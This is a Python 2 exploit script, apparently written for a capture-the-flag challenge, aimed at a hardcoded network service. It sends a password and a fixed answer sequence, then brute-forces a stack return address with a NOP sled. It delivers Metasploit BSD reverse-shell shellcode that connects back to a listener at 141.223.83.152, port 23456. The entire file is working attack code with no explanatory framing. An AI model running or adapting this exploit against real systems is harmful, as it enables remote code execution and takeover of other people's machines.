#!/usr/bin/python
import os, sys, struct
import socket
import time

HOST = "141.223.83.188"
#HOST = "pwn553.ddtek.biz"
PORT = 3555

#/* bsd_ia32_reverse -  LHOST=141.223.83.152 LPORT=23456 Size=68 Encoder=None http://metasploit.com */
#unsigned char scode[] =
SCODE = "\x81\xec\x80\x00\x00\x00"
SCODE += "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\x8d\xdf\x53\x98\xcd\x80"
SCODE +="\x68\x10\x02\x5b\xa0\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58"
SCODE +="\xcd\x80\x6a\x02\x59\xb0\x5a\x51\x57\x51\xcd\x80\x49\x79\xf6\x50"
SCODE +="\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53"
SCODE +="\xb0\x3b\xcd\x80"

class Exploit:
    def __init__( self):
        self.sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect( (HOST, PORT))
        #time.sleep(0.5)
        self.sock.settimeout(1)

    def communicator( self, data):
        nBytes = self.sock.send( data)
        #print "send [0x%x] bytes" % nBytes

        response = ""
        while 1:
            try:
                thisRes = self.sock.recv(10000)
                if len(thisRes) == 0:
                    break
                response += thisRes
            except:
                break

        #print "[0x%x] %s " % (len(response), response)
        return response
    
    def read(self):
        response = self.sock.recv(10000)
        #print "[0x%x] %s " % (len(response), response)
        return response

    def write(self, data):
        nBytes = self.sock.send( data)
        #print "send [0x%x] bytes" % nBytes
        return nBytes


def attack(addr):
    exp = Exploit()

    exp.write("tomod@chi4j00l333people$\n")
    exp.read()

    data = "A" *0x64 + "\xF0" + "\n"
    exp.write( data)
    exp.read()

    answers = [1,1,0,1,0,1,0,1,0,1,0,1,0,1,1]

    answerStr = ""
    for i, answer in enumerate(answers):
        #print "[*] try %d th answer [%d]" %(i,answer)
        answerStr += "%d\n" % answer
    #exp.write("%d\n" % answer)
    exp.write(answerStr)
    time.sleep(1)
    res = exp.read()
    print res

    # Congrats your hackerling is 18... he wa"
    #retAddrStr = struct.pack("<I", 0xbfbfec30)
    retAddrStr = struct.pack("<I", addr)
    
    data = ""
    #data += "A" * 0x60
    data += "\x90" * 0x5e
    data += "\xeb\x30"

    data += retAddrStr * 10
    data += "\x90" * 0x10
    data += SCODE
    data += "\n"
    
    exp.write( data)
    exp.read()
    exp.write("1\n")
    exp.read()
    return

if __name__ == "__main__":
    #addr = 0xbfbfe000
    addr = 0xbfbfea00
    for i in range(10000):
        print "addr : %08x" % addr
        attack(addr)
        addr = addr + 0x50
              
